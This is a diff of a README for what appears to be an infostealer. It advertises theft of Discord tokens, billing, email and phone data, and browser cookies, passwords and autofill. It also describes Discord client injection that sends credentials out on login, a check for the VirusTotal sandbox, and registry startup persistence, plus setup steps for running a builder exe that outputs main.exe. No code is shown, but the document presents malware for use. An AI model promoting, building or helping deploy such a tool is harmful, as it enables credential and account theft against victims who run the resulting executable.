@@ -1,77 +1,50 @@
+## Features
 
-features
+-   Discord token info
+    -   Nitro
+    -   Badges
+    -   Billing
+    -   Email
+    -   Phone
+    -   HQ Guilds
+    -   HQ Friends
+    -   Gift codes
+-   Browser data
+    -   Cookies
+    -   Passwords
+    -   History
+    -   Bookmarks
+    -   Autofill
+    -   Chrome, Edge, Brave, Opera GX, and many more...
+-   Discord injection
+    -   Send token, password, and email on login or when password is changed
+-   System info
+    -   User
+    -   System
+    -   Disk
+    -   Network
+    -   WiFi
+    -   Screenshot
+-   Anti-debug
 
-Discord token info
+    -   Check if being run in a virustotal sandbox
 
-Nitro
+-   Startup persistence
+    -   Place stub in appdata
+    -   Add to startup registry
 
-Badges
+## Install
 
-Billing
+### Prerequisites
 
-Email
+-   Windows 10/11
+-   [Python](https://www.python.org/downloads/release/python-3109/)
+-   [Git](https://git-scm.com/download/win)
 
-Phone
+### Setup
 
-HQ Guilds
-
-HQ Friends
-
-Gift codes
-
-Browser data
-
-
-browser info
-
-Cookies
-
-Passwords
-
-History
-
-Bookmarks
-
-Autofill
-
-Chrome, Edge, Brave, Opera GX, and many more...
-
-Discord injection
-
-Send token, password, and email on login or when password is changed
-System info
-
-User
-
-System
-
-Disk
-
-Network
-
-WiFi
-
-Screenshot
-![bu0](https://user-images.githubusercontent.com/125326152/233845026-e937dd70-f419-4a02-954b-3e2e3281bdc4.png)
-
-Install
-
-Prerequisites
-
-Windows 10/11
-
-Python
-
-Git
-
-Setup
-
-Download source code zip
-
-Extract zip
-
-install python if not installed 
-
-Run the builder by double clicking the renicail.exe file
-
-Follow instructions in builder and your exe will be found in the dist folder under the name main.exe
+1. 
+2. Extract zip
+3. Install python if you don't have python installed
+4. Run the builder by double clicking the `renicail.exe` file
+5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
